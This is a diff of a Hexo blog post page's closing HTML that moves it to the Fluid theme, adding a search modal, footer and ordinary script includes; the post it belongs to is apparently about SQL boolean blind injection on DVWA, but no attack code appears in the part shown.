+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-<div class="lx-navigation">
-	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Next</span>
-						<h3>CumtCTF2019Ⅱ——Writeup（Web详解）</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/02/13/文件包含漏洞总结/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Prev</span>
-						<h3>文件包含漏洞总结</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-</div>
-</div>
-<div class="comment"><div id="comments"></div></div>
-<footer>
-  <div>
-  Copyright &copy; 2019.<a href="/">Lethe | 忘川</a>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
   </div>
 </footer>
-</div>
 
-<button class="menu-trigger"></button>
-<div class="menu">
-  <div class="menu-head">
-    <span class="layer">
-      <div class="col">
-        <div class="row for-pic">
-          <div class="profile-pic">
-            <a href="/"><img src="/images/2.jpg" alt="Lethe"></a>
-          </div>
-        </div>
-        <div class="row for-name">
-          <p>Lethe</p>
-          <span class="tagline">Hello, World!</span>
-        </div>
-      </div>
-    </span>
-  </div>
-  <nav class="menu-container">
-  <ul class="menu-items">
-    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
-    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-bookmark fa-fw"></i>页面</span>
-        <ul>
-          <li><a href="/about">关于</a></li>
-        </ul>
-    </li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-link fa-fw"></i>友链</span>
-        <ul>
-          <li> <a href="https://hiworldalice.github.io/" target="_blank">Tunt</a></li>
-        <li> <a href="https://3nd.xyz" target="_blank">3ND</a></li>
-        </ul>
-    </li>
-  </ul>
-  </nav>
-</div>
-
-<div class="gototop js-top">
-  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
-</div>
-<script src="/js/jquery.easing.min.js"></script>
-<script src="/js/jquery.waypoints.min.js"></script>
-<script src="/js/jquery.stellar.min.js"></script>
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/popper/popper.min.js"></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js"></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
+  <script src="/js/lazyload.js"></script>
 
+
+  
+    <script src="/lib/tocbot/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+  <script src="/lib/prettify/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+  <script src="/lib/typed/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "以dvwa为例学习简单sql布尔盲注的详细脚本&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+  <script src="/lib/anchor/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script>
+    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
+      $("#background").css("background-attachment", "scroll");
+    }
+  </script>
 
 </body>
 </html>
